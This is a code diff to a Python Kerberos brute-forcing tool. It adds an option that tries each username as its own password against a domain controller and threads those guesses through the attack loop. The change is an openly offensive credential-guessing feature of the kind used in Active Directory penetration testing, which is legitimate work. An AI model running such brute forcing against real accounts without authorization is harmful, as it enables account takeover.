@@ -48,6 +48,7 @@ class KerbruteArgumentParser:
         password_group = self._parser.add_mutually_exclusive_group()
         password_group.add_argument('-password', help='Password to perform bruteforcing')
         password_group.add_argument('-passwords', help='File with password per line')
+        password_group.add_argument('-usernameaspassword', action='store_true', help='use username as password', default=False)
 
         self._parser.add_argument('-domain', required=True, help='Domain to perform bruteforcing')
 
@@ -108,7 +109,7 @@ def main():
     out_users_file = open(args.outputusers, "w") if args.outputusers else None
 
     kerberos_bruter = KerberosBruter(args.domain, args.dc_ip, args.save_ticket, out_creds_file, out_users_file)
-    kerberos_bruter.attack(args.users, args.passwords, args.threads)
+    kerberos_bruter.attack(args.users, args.passwords, args.threads, usernameaspassword=args.usernameaspassword)
 
     if out_creds_file:
         out_creds_file.close()
@@ -142,12 +143,14 @@ class KerberosBruter:
         self.out_creds_file = out_creds_file
         self.out_users_file = out_users_file
 
-    def attack(self, users, passwords, threads=1):
+    def attack(self, users, passwords, threads=1, usernameaspassword=False):
         pool = ThreadPoolExecutor(threads)
         threads = []
 
         for password in passwords:
             for user in users:
+                if usernameaspassword:
+                  password = user
                 t = pool.submit(self._handle_user_password, user, password)
                 threads.append(t)
 
